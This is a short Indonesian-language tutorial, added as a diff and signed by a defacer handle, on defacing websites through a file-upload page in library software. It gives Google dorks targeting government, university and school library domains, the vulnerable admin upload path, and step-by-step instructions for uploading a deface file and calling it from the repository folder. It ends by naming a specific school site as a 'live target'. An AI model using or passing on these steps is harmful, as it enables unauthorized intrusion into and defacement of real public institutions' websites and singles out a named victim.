@@ -1,0 +1,58 @@
+Deface File 
+Attachment Upload Repository
+
+|====================================================|
+|Tutorial Deface Website Method Attachment Repository|
+|====================================================|
+
+
+Bahan :
+-Koneksi Internet. Ya Iyalah Qymak >:(
+-Hp/Laptop. kalo Gak Ada Pake Hp Esia :v
+-Kopi
+-Indomie
+-Video Vokep Yang Viral :v
+-Dork
+-Exploit
+
+Dork :
+- inurl:/admin/modules/bibliography/pop_attach.php
+- pustaka.*.go.id
+- pustaka.*.ac.id
+- pustaka.*.sch.id
+- pustaka.*.(isi dengan domain yang lu mau :v)
+*Pilih Salah Satu Dork Yang Lu Mau Trs Salin Di Kotak Pencarian Google :D
+Note:*Kembangkan Dork Di Atas Dengan Imajinasi Otak Vokep Kalian eaa
+
+-Exploit : /admin/modules/bibliography/pop_attach.php
+
+Note:*Ext file to upload (txt)
+
+Langkah-langkah :
+
+Pertama, kita dorking menggunakan salah satu dork diatas.
+
+Kedua, pilih salah satu target.
+Ketiga, masukan exploit diatas dibelakang site/
+
+Contoh :
+http://sitecontoh.sch.id
+Ditambah exploit menjadi :
+http://sitecontoh.sch.id/admin/modules/bibliography/pop_attach.php
+
+Keempat, kita isi namanya dan upload Script Deface Kalian Dgn Format *.txt*
+
+Lalu klik unggah sekarang!
+
+Kelima, kita panggil filenya, lokasi file :www.site.sch.id/repository/yourfile.txt
+
+ **Dan Taraaaa Treng Teng Teng Teng... Kalian Sudah Bisa Melihat Hasil Deface Kalian^_^**
+ 
+                           *Happy Deface ^_^*
+
+
+*Live Target: http://lib-smpn2ponorogo.sch.id/
+
+                            |=============|
+                            |_Mr.B41B4L.X_|
+                            |=============|
